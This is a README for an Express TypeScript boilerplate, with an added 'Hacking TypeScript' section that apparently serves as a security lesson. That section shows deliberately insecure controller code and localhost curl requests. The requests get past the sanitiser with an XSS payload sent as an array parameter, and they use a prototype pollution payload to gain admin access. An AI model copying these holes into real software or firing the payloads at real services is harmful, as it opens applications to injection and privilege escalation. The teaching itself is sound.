# 🚀 Express TypeScript Boilerplate 2024

[![Build](https://github.com/edwinhern/express-typescript-2024/actions/workflows/build.yml/badge.svg)](https://github.com/edwinhern/express-typescript-2024/actions/workflows/build.yml)
[![Test](https://github.com/edwinhern/express-typescript-2024/actions/workflows/test.yml/badge.svg)](https://github.com/edwinhern/express-typescript-2024/actions/workflows/test.yml)
[![Code Quality](https://github.com/edwinhern/express-typescript-2024/actions/workflows/code-quality.yml/badge.svg)](https://github.com/edwinhern/express-typescript-2024/actions/workflows/code-quality.yml)
[![Docker Image CI](https://github.com/edwinhern/express-typescript-2024/actions/workflows/docker-image.yml/badge.svg)](https://github.com/edwinhern/express-typescript-2024/actions/workflows/docker-image.yml)

``` code
Hey There! 🙌 
🤾 that ⭐️ button if you like this boilerplate. 
```

## 🌟 Introduction

Welcome to the Express TypeScript Boilerplate 2024 – a streamlined, efficient, and scalable foundation for building powerful backend services with modern tools and practices in Express.js and TypeScript.

## 💡 Motivation

This boilerplate aims to:

- ✨ Reduce setup time for new projects
- 📊 Ensure code consistency and quality
- ⚡  Facilitate rapid development
- 🛡️ Encourage best practices in security, testing, and performance

## 🚀 Features

- 📁 Modular Structure: Organized by feature for easy navigation and scalability
- 💨 Faster Execution with tsx: Rapid TypeScript execution with `tsx` and type checking with `tsc`
- 🌐 Stable Node Environment: Latest LTS Node version in `.nvmrc`
- 🔧 Simplified Environment Variables: Managed with Envalid
- 🔗 Path Aliases: Cleaner code with shortcut imports
- 🔄 Renovate Integration: Automatic updates for dependencies
- 🔒 Security: Helmet for HTTP header security and CORS setup
- 📊 Logging: Efficient logging with `pino-http`
- 🧪 Comprehensive Testing: Setup with Vitest and Supertest
- 🔑 Code Quality Assurance: Husky and lint-staged for consistent quality
- ✅ Unified Code Style: `Biomejs` for consistent coding standards
- 📃 API Response Standardization: `ServiceResponse` class for consistent API responses
- 🐳 Docker Support: Ready for containerization and deployment
- 📝 Input Validation with Zod: Strongly typed request validation using `Zod`
- 🧩 Swagger UI: Interactive API documentation generated from Zod schemas

## 🛠️ Getting Started

### Video Demo

For a visual guide, watch the [video demo](https://github.com/user-attachments/assets/b1698dac-d582-45a0-8d61-31131732b74e) to see the setup and running of the project.

### Step-by-Step Guide

#### Step 1: 🚀 Initial Setup

- Clone the repository: `git clone https://github.com/edwinhern/express-typescript-2024.git`
- Navigate: `cd express-typescript-2024`
- Install dependencies: `npm ci`

#### Step 2: ⚙️ Environment Configuration

- Create `.env`: Copy `.env.template` to `.env`
- Update `.env`: Fill in necessary environment variables

#### Step 3: 🏃‍♂️ Running the Project

- Development Mode: `npm run dev`
- Building: `npm run build`
- Production Mode: Set `.env` to `NODE_ENV="production"` then `npm run build && npm run start`

## 🤝 Feedback and Contributions

We'd love to hear your feedback and suggestions for further improvements. Feel free to contribute and join us in making backend development cleaner and faster!

🎉 Happy coding!

## 💀 Hacking TypeScript

### TypeScript Validation Fail #1

In the users controller file at `src/api/user/userController.ts` we have the following code:

```typescript
class UserController {
  public getUsers: RequestHandler = async (_req: Request, res: Response) => {
    const filterQuery: any = _req.query.filter || '';

    console.log(`req.query.filter: ${filterQuery}; typeof: ${typeof filterQuery}`);

    const serviceResponse = await userService.findAll({ filter: filterQuery });
    return handleServiceResponse(serviceResponse, res);
  };
```

Even though we are using TypeScript, we defined the filterQuery as `any` which is the obvious glaring mistake. So upon sending a request to the `/api/users` endpoint with a query parameter `filter` that may not be a string, we get the following to send a response back

```bash
curl -X 'GET' -H 'accept: application/json' "http://localhost:8080/users?filter[]=A"| jq
```

### TypeScript Validation Fail #2

In the users controller file at `src/api/user/userController.ts` we have the following code:

```typescript
class UserController {
  public getUsers: RequestHandler = async (_req: Request, res: Response) => {
        const filterQuery: string = _req.query.filter as string || '';

    console.log(`req.query.filter: ${filterQuery}; typeof: ${typeof filterQuery}`);

    const serviceResponse = await userService.findAll({ filter: filterQuery });
    return handleServiceResponse(serviceResponse, res);
  };
```

We have now improved upon the previous code and treat the `filterQuery` as a string.

Next, run the TS compiler to ensure all types are as expected:

```bash
npx tsc
```

Let's send a request to see how the server behaves:

```bash
curl -X 'GET' -H 'accept: application/json' "http://localhost:8080/users?filter[]=A"| jq
```

Still, we get results back. Even though, supposedly we should only be accepting a string as a filter query and not arrays, per our TypeScript definitions.

### TypeScript Security Bypass #3

We send in a query parameter that is a string but contains a malicious payload but it gets sanitized correctly per our logic:

```bash
curl -G -X 'GET' -H 'accept: application/json' "http://localhost:8080/users/component" --data-urlencode "name=<img liran"

Bad input detected!
```

What happens if we update the query string so that the field is to be interpreted as an array instead of a string?

```bash
curl -G -X 'GET' -H 'accept: application/json' "http://localhost:8080/users/component" --data-urlencode "name[]=<img src=x onError=alert(1) />"           

<h1>Hello, <img src=x onError=alert(1) />!</h1>
```

### TypeScript Security Bypass #4

Let's bypass both TypeScript types and Zod schema input validation.

First off, a safe request:

```bash
curl http://localhost:8080/users/1/settings | jq
```

Let's set a setting to enabled:

```bash
curl -X POST -H 'Content-Type: application/json' http://localhost:8080/users/1/settings -d '{"darkmode": true}' 
```

Now let's specifically set the notifications settings

```bash
curl -X PUT -H 'Content-Type: application/json' http://localhost:8080/users/1/settings/notifications -d '{"notificationType": "email", "notificationMode": "daily", "notificationModeValue": "disabled"}'
```

Now let's abuse this with a prototype pollution payload:

```bash
curl -X PUT -H 'Content-Type: application/json' http://localhost:8080/users/1/settings/notifications -d '{"notificationType": "__proto__", "notificationMode": "isAdmin", "notificationModeValue": true}'
```

Let's try to access the admin route now:

```bash
curl http://localhost:8080/admin
```